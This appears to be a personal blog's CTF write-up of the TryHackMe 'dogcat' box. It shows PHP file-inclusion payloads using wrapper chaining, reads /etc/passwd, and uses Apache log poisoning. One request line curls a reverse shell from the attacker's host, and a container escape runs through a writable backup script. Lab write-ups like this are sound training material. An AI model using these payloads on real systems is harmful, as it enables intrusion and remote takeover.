@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>TryHackMe: dogcat - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<meta property="og:title" content="TryHackMe: dogcat" />
+<meta property="og:description" content="My write-up for dogcat, a TryHackMe box created by jammy." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tryhackme-dogcat/" />
+<meta property="article:published_time" content="2021-06-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-06-06T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TryHackMe: dogcat"/>
+<meta name="twitter:description" content="My write-up for dogcat, a TryHackMe box created by jammy."/>
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="/">
+				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
+	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
+			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="author">
+				
+			</div>
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">06</span>
+							<span class="rest">Jun 2021</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">TryHackMe: dogcat</h1>
+				</div>
+			</div>
+			<div class="markdown">
+				<p>Here&rsquo;s my write-up for <a href="https://tryhackme.com/room/dogcat">dogcat</a>, a CTF challenge created by <a href="https://tryhackme.com/p/jammy">jammy</a>.</p>
+<h3 id="write-up">Write-up</h3>
+<p>I deployed the box using TryHackMe&rsquo;s interface and scanned the host using <code>nmap</code>:</p>
+<p><img src="/static/dogcat/1.png" alt=""></p>
+<p>Two ports: SSH on port 22 and Apache on port 80. I took a look first at what was running on port 80.</p>
+<p><img src="/static/dogcat/2.png" alt="">
+<img src="/static/dogcat/3.png" alt=""></p>
+<p>It was a website that showed you pictures of cats and dogs. Awh how nice. The showing of dogs and cats was controlled by a query parameter in the URL:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?view=dog
+?view=cat
+</code></pre></div><p>I tried a few different words, such as bird, fish, etc. but I was returned an error message: &ldquo;Sorry, only dogs or cats are allowed.&rdquo;</p>
+<p><img src="/static/dogcat/4.png" alt=""></p>
+<p>I started messing with this parameter and managed to break something fairly quickly:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?view=dog&#34;--
+</code></pre></div><p><img src="/static/dogcat/5.png" alt=""></p>
+<p>This error showed me two things: a file was being &ldquo;included&rdquo; in the script, and &ldquo;.php&rdquo; was being appended to the parameter value. I did some reading around LFI in PHP applications and managed to get a base64 encoded version of cat.php with the following query parameter:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?view=php://filter/convert.base64-encode/resource=cat
+</code></pre></div><p><img src="/static/dogcat/6.png" alt=""></p>
+<p>I did the same for &ldquo;dog&rdquo;, and I now had the source code for cat.php and dog.php:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(base64) PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 
+&lt;img src=&#34;cats/&lt;?php echo rand(1, 10); ?&gt;.jpg&#34; /&gt;
+
+(base64) PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 
+&lt;img src=&#34;dogs/&lt;?php echo rand(1, 10); ?&gt;.jpg&#34; /&gt;
+</code></pre></div><p>I then tried &ldquo;index&rdquo; to see if I could get the contents of index.php but no luck, the filter was getting in the way. Something was checking that the <code>view</code> query parameter value had &ldquo;cat&rdquo; or &ldquo;dog&rdquo; in it. I messed around with this for quite a while, before coming up with a solution.</p>
+<p>I remembered that you could chain PHP wrappers:</p>
+<p><img src="/static/dogcat/8.png" alt=""></p>
+<p>What would happen if I added &ldquo;cat&rdquo;? Would it just be ignored because it&rsquo;s not a valid filter?</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?view=php://filter/convert.base64-encode|cat/resource=index
+</code></pre></div><p><img src="/static/dogcat/7.png" alt=""></p>
+<p>It worked! I now had the source code for index.php</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;dogcat&lt;/title&gt;
+    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;/style.css&#34;&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt;dogcat&lt;/h1&gt;
+    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;
+
+    &lt;div&gt;
+        &lt;h2&gt;What would you like to see?&lt;/h2&gt;
+        &lt;a href=&#34;/?view=dog&#34;&gt;&lt;button id=&#34;dog&#34;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&#34;/?view=cat&#34;&gt;&lt;button id=&#34;cat&#34;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        &lt;?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+        $ext = isset($_GET[&#34;ext&#34;]) ? $_GET[&#34;ext&#34;] : &#39;.php&#39;;
+            if(isset($_GET[&#39;view&#39;])) {
+                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
+                    echo &#39;Here you go!&#39;;
+                    include $_GET[&#39;view&#39;] . $ext;
+                } else {
+                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;
+                }
+            }
+        ?&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre></div><p>The source code of index.php exposed another parameter: &ldquo;ext&rdquo;. Sending this parameter through with the request but leaving it blank stopped the &ldquo;.php&rdquo; bit from being added. Now I had a way to look at any file I wanted, given the user had permissions of course.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://10.10.172.246/?view=php://filter/convert.base64-encode|cat/resource=/etc/passwd&amp;ext=
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</code></pre></div><p>Now I had to go about getting a shell set up. I did a bit more research and came across a log poisoning technique, where you inject some malicious PHP code into the logs, then load the log file using the LFI exploit, thus executing your code. First I checked that I could access the log file.</p>
+<p><img src="/static/dogcat/9.png" alt=""></p>
+<p>I could see all the requests I had made previously, so this looked like it was going to work. I loaded up netcat and sent a simple shell script to the server.</p>
+<p><img src="/static/dogcat/10.png" alt=""></p>
+<p>I loaded up the log file using the LFI exploit, and I could see my commands being executed and displayed in the response.</p>
+<p><img src="/static/dogcat/11.png" alt="">
+<img src="/static/dogcat/12.png" alt="">
+<img src="/static/dogcat/13.png" alt="">
+<img src="/static/dogcat/14.png" alt=""></p>
+<p>The next thing to do was to try and get a reverse shell onto the box. I tried to run a few basic reverse shell commands, but they weren&rsquo;t working. This box didn&rsquo;t have a lot installed on it, but it did have curl.</p>
+<p>I hosted a reverse shell on my machine, on port 4000, and used my basic command shell to download it and save it as &ldquo;shell.php&rdquo; on the box.
+<img src="/static/dogcat/16.png" alt=""></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">?view=php://filter/convert.base64-encode|convert.base64-decode|cat/resource=/var/log/apache2/access.log&amp;ext=&amp;cmd=curl+http%3a//10.11.23.23%3a4000/shell.php+--output+shell.php
+</code></pre></div><p>I set up netcat, hit shell.php with Burp, and I had access.</p>
+<p><img src="/static/dogcat/15.png" alt="">
+<img src="/static/dogcat/18.png" alt=""></p>
+<p>The next thing to do was to escalate my access. This wasn&rsquo;t too tricky. I ran <code>sudo -l</code> and could see that www-data could run <code>/usr/bin/env</code> as root without a password, which gave me access to a root shell.</p>
+<p><img src="/static/dogcat/20.png" alt="">
+<img src="/static/dogcat/19.png" alt="">
+<img src="/static/dogcat/21.png" alt=""></p>
+<p>I looked around a bit, and saw some signs that I was in a container. <code>ps -aux</code> was returning limited results, and the root directory had a <code>.dockerenv</code> file.</p>
+<p><img src="/static/dogcat/22.png" alt="">
+<img src="/static/dogcat/23.png" alt=""></p>
+<p>I looked around a little more and came across a backup file and backup script in the <code>opt</code> directory. This script looked like it was running from the host machine. The root user on the container had write privileges to this script, so I rewrote the script to be a reverse shell and set up a listener using netcat on my machine.</p>
+<p><img src="/static/dogcat/24.png" alt="">
+<img src="/static/dogcat/25.png" alt=""></p>
+<p>After about a minute or two, whatever was running the backup script executed the script, and I had a shell on the host. This is where the final flag was located.</p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>A super interesting challenge that required me to think of a funky way to get around LFI filtering. Thank you jammy!</p>
+
+			</div>
+			<div class="tags">
+				
+				
+				
+				
+					
+				
+					
+				
+				
+			</div></div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div class="footertext"></div>
+	</nav>
+</div>
+
+
+
+</body>
+</html>
